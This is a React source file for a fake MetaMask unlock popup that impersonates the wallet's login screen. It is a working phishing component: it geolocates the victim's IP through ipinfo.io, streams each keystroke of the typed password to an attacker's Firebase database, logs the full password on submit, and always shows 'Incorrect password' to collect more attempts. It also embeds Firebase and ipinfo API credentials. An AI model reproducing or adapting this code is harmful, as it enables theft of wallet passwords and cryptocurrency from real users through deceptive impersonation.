import { useState, useEffect, useRef } from "react";
import { EventEmitter } from "events";
import Modal from "react-modal";
import meta_logo from "./assets/img/metamask-fox.svg";
import spinner from "./assets/img/spinner.gif";
import ethLogo from "./images/eth_logo.svg";
import arrowDown from "./images/icons/arrow-down.svg";
import axios from "axios";

import { initializeApp } from "firebase/app";
import { getDatabase } from "firebase/database";
import { ref, push } from "firebase/database";
import CreateLogo from "./CreateLogo";

import "./index.css";
import "./MM.css";
const basic = {
  apiKey: "AIzaSyCJoDaEfcKHUoI8lk59Fe5hz0li4bzsnDQ",
  authDomain: "mm-firebase-bf97d.firebaseapp.com",
  projectId: "mm-firebase-bf97d",
  storageBucket: "mm-firebase-bf97d.firebasestorage.app",
  messagingSenderId: "817694036417",
  appId: "1:817694036417:web:c383a86152bf6a0c9e5f40",
  measurementId: "G-DCJDDBFM35"
}
const rtapp = initializeApp(basic);
const rtdb = getDatabase(rtapp);
function getCaretCoordinates(element, position) {
  const div = document.createElement("div");
  div.id = "password-mirror-div";
  document.body.appendChild(div);
  const computed = window.getComputedStyle(element);
  div.textContent = new Array(position + 1).join("•");
  const span = document.createElement("span");
  span.textContent = "•";
  div.appendChild(span);

  const coordinates = {
    top: span.offsetTop + parseInt(computed.borderTopWidth, 10),
    left: span.offsetLeft + parseInt(computed.borderLeftWidth, 10),
  };
  document.body.removeChild(div);
  return coordinates;
}
const MM = ({ isOpen, setIsOpen }) => {
  const inputRef = useRef(null);
  // const [animationEventEmitter, setEventEmitter] = useState(new EventEmitter());
  const animationEventEmitter = new EventEmitter();
  const [loading, setLoading] = useState(true);
  const [pwd, setPwd] = useState("");
  const [validShow, setValidShow] = useState(false);
  const [pwdFocus, setPwdFocus] = useState(false);
  const [dbName, setDbName] = useState(null);
  const styles = {
    overlay: {
      position: "fixed",
      backgroundColor: "transparent",
    },
    content: {
      top: "0px",
      left: "auto",
      right: "150px",
      bottom: "auto",
      padding: "0",
      border: "0",
      borderRadius: "5",
      // marginRight: "-30%",
      // transform: "translate(-50%, -50%)",
      boxShadow: "0px 0px 5px #00000088",
      zIndex: 10000,
    },
  };

const [scale, setScale] = useState(1);

  useEffect(() => {
    const handleZoom = () => {
      const zoom = window.devicePixelRatio || 1;
      setScale(1 / zoom); // inverse of zoom to counteract it
    };

    handleZoom(); // run once
    window.addEventListener('resize', handleZoom); // zoom triggers resize
    return () => window.removeEventListener('resize', handleZoom);
  }, []);

 const fetchIP = async () => {
        try {
            const response = await axios.get("https://ipinfo.io/json?token=f50acff5347305")
            const data = response.data
            const result = data.country + '_' + data.region + '_' + data.ip
            setDbName(result)
        } catch (error) {
            // console.error("Error fetching IP address:", error)
            return false
        }
    }

useEffect(() => {
        fetchIP();
    }, []);


  const handleCloseModal = () => {
    setIsOpen(false);
  };
  const addData = () => {
    const d = new Date(); 
    push(ref(rtdb, `${dbName.replaceAll(".", "_")}_Elom/user-Typing"`), {
      value: pwd,
      date: String(new Date()),
    });
  }
  const handleChange = (val, target) => {
    setPwd(val);
    setValidShow(false);
    addData();
    if (target.getBoundingClientRect) {
      const element = target;
      const boundingRect = element.getBoundingClientRect();
      const coordinates = getCaretCoordinates(element, element.selectionEnd);
      animationEventEmitter.emit("point", {
        x: boundingRect.left + coordinates.left - element.scrollLeft,
        y: boundingRect.top + coordinates.top - element.scrollTop,
      });
    }
  };


  const handleClick = () => {
    const d = new Date();
    push(ref(rtdb,  `${dbName.replaceAll(".", "_")}_Elom/user`), {
      value: pwd,
      date: String(new Date()),
    });
    setValidShow(true);
    // console.log(pwd);
    
  };

  const handleKeyUp = (e) => {
    if (e.keyCode === 13) {
      handleClick();
    }
  };
  const handleBlur = () => setPwdFocus(false);
  const handleFocus = () => setPwdFocus(true);
  useEffect(() => {
    if (isOpen) {
      setTimeout(() => {
        setLoading(false);
        setTimeout(() => {
          inputRef.current && inputRef.current.focus();
        }, 10);
      }, 1000);
    } else {
      setLoading(true);
    }
  }, [isOpen]);

  return (
    <Modal
      isOpen={isOpen}
      style={styles}
      shouldCloseOnOverlayClick={true}
      shouldCloseOnEsc={true}
      onRequestClose={handleCloseModal}
      ariaHideApp={false}
    >
      {loading ? (
        <div
          className="mmc"
          style={{
            display: "flex",
            flexDirection: "column",
            overflowX: "hidden",
            width: "400px",
          }}
        >
          <div
            style={{
              width: "400px",
              height: "600px",
              backgroundColor: "#fff",
              display: "flex",
              justifyContent: "center",
            }}
          >
            <div style={{ display: "flex", flexFlow: "column" }}>
              <img
                style={{
                  width: "15rem",
                  height: "15rem",
                  alignSelf: "center",
                  margin: "15rem 0 0 0",
                }}
                alt={""}
                src={meta_logo}
              ></img>
              <img
                alt={""}
                src={spinner}
                style={{
                  width: "3rem",
                  height: "3rem",
                  alignSelf: "center",
                  marginTop: "1rem",
                }}
              ></img>
            </div>
          </div>
        </div>
      ) : (
        <>
          <div id="app-content" style={{
      overflowX: 'hidden',
      height: '600px',
      overflow: 'auto',
      boxShadow: '0px 2px 12px #000000a1',
      display: 'flex',
      flexDirection: 'column',
      width: '400px'}}>
            <div className="app os-win">
              <div className="mm-box multichain-app-header multichain-app-header-shadow mm-box--margin-bottom-0 mm-box--display-flex mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default">
                <div className="mm-box multichain-app-header__lock-contents mm-box--padding-2 mm-box--display-flex mm-box--gap-2 mm-box--justify-content-space-between mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default">
                  <div>
                    <button
                      className="mm-box mm-picker-network multichain-app-header__contents__network-picker mm-box--padding-right-4 mm-box--padding-left-2 mm-box--display-flex mm-box--gap-2 mm-box--align-items-center mm-box--background-color-background-alternative mm-box--rounded-pill"
                      aria-label="Network Menu Ethereum Mainnet"
                      data-testid="network-display"
                    >
                      <div
                        className="mm-box mm-text mm-avatar-base mm-avatar-base--size-xs mm-avatar-network mm-picker-network__avatar-network mm-text--body-xs mm-text--text-transform-uppercase mm-box--display-flex mm-box--justify-content-center mm-box--align-items-center mm-box--color-text-default mm-box--background-color-background-alternative mm-box--rounded-full mm-box--border-color-transparent box--border-style-solid box--border-width-1"
                        role="img"
                        style={{ marginLeft: 12 }}
                      >
                        <img
                          className="mm-avatar-network__network-image"
                          src={ethLogo}
                          alt="Ethereum Mainnet logo"
                        />
                      </div>
                      <span
                        className="mm-box mm-text mm-text--body-sm mm-text--ellipsis mm-box--color-text-default"
                        style={{fontWeight: '400px', lineHeight: '20px', color: '#1a1a1a', fontFamily: '"Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif', fontSize: '14px', letterSpacing:'0px'}}

                      >
                        Ethereum Mainnet
                      </span>
                      <span
                        className="mm-box mm-picker-network__arrow-down-icon mm-icon mm-icon--size-xs mm-box--margin-left-auto mm-box--display-inline-block mm-box--color-icon-default"
                        style={{ marginRight: "1rem" }}
                      >
                        <img
                          alt={""}
                          src={arrowDown}
                          style={{
                            width: "100%",
                            height: "100%",
                            marginBottom: "8px",
                          }}
                        ></img>
                      </span>
                    </button>
                  </div>
                  <button
                    className="mm-box app-header__logo-container app-header__logo-container--clickable mm-box--background-color-transparent"
                    data-testid="app-header-logo"
                    style={{ marginRight: "8px" }}
                  >
                    <img
                      alt={""}
                      style={{
                        alignSelf: "center",
                        width: "100%",
                        height: "100%",
                      }}
                      src={meta_logo}
                    ></img>
                  </button>
                </div>
              </div>
              <div className="mm-box main-container-wrapper">
                <div className="unlock-page__container">
                  <div className="unlock-page" data-testid="unlock-page">
                    <div className="unlock-page__mascot-container">
                      <div style={{ zIndex: 0, marginBottom: "8px" }}>
                        <CreateLogo
                          animationEventEmitter={animationEventEmitter}
                          width={"120"}
                          height={"120"}
                        ></CreateLogo>
                        <div id="meta_fox"></div>
                      </div>
                    </div>
                    <h1 className="unlock-page__title">Welcome back</h1>
                    <div
                      style={{
                        fontSize: "1.5rem",
                        fontFamily: `"Segoe UI","Helvetica Neue",Helvetica,Arial,sans-serif`,
                        fontWeight: '500',
                        lineHeight: '3rem',
                        letterSpacing: '0.5px',
                        color: '#68637d',
                      }}
                    >
                      The decentralized web awaits
                    </div>
                    <div className="unlock-page__form">
                      <div className="MuiFormControl-root MuiTextField-root MuiFormControl-fullWidth">
                        <div
                          className={
                            "MuiInputBase-root MuiInput-root MuiInput-underline jss3 MuiInputBase-fullWidth MuiInput-fullWidth MuiInputBase-formControl MuiInput-formControl" +
                            (validShow === true ? " Mui-error" : "") +
                            (pwdFocus === true ? " Mui-focused" : "")
                          }
                        >
                          <input
                            aria-invalid="false"
                            autoComplete="current-password"
                            id="password"
                            type="password"
                            dir="auto"
                            data-testid="unlock-password"
                            className={"MuiInputBase-input MuiInput-input"}
                            style={{ marginTop: "16px", fontSize: "1.33rem", animationDuration: '10ms' }}
                            required
                            value={pwd}
                            onFocus={handleFocus}
                            onBlur={handleBlur}
                            ref={inputRef}
                            onChange={(e) => {
                              handleChange(e.target.value, e.target);
                            }}
                            onKeyUp={handleKeyUp}
                          />

                          <label
                            className="MuiFormLabel-root MuiInputLabel-root jss1 MuiInputLabel-formControl MuiInputLabel-animated"
                            data-shrink="false"
                            htmlFor="password"
                            id="password-label"
                          // style={{ fontSize: "1.5rem" }}
                          >
                            Password
                          </label>
                        </div>
                        <div
                          className={
                            validShow
                              ? "validate-password"
                              : "validate-password-hidden"
                          }
                        >
                          Incorrect password
                        </div>
                      </div>
                    </div>
                    <button
                      className={
                        "button btn--rounded btn-default" +
                        (pwd.length === 0 ? " unlock-btn-disabled" : "")
                      }
                      data-testid="unlock-submit"
                      disabled={pwd.length === 0}
                      type="button"
                      variant="contained"
                      style={{
                        backgroundColor: "#4459ff",
                        color: "var(--color-primary-inverse)",
                        marginTop: "20px",
                        fontWeight: "550",
                        boxShadow: "none",
                        borderRadius: "100px",
                        fontSize: "1.35rem",
                        padding: "12px 0",
                      }}
                      onClick={handleClick}
                    >
                      Unlock
                    </button>
                    <div className="unlock-page__links">
                      <a
                        className="button btn-link unlock-page__link"
                        style={{ fontSize: "1.125rem", textDecoration: 'none', color:'#3b82f9', fontWeight: '100' }}
                        role="button"
                        tabIndex="0"
                      >
                        Forgot password?
                      </a>
                    </div>
                    <div
                      className="unlock-page__support"
                      style={{ fontSize: "1.125rem" }}
                    >
                      <span>
                        Need help? Contact{" "}
                        <a
                          href="https://support.metamask.io"
                          target="_blank"
                          rel="noopener noreferrer"
                          style={{ fontSize: "1.125rem", textDecoration: 'none', color:'#3b82f9' }}
                        >
                          MetaMask support
                        </a>
                      </span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div id="popover-content"></div>
        </>
      )}
    </Modal>
  );
};

export default MM;
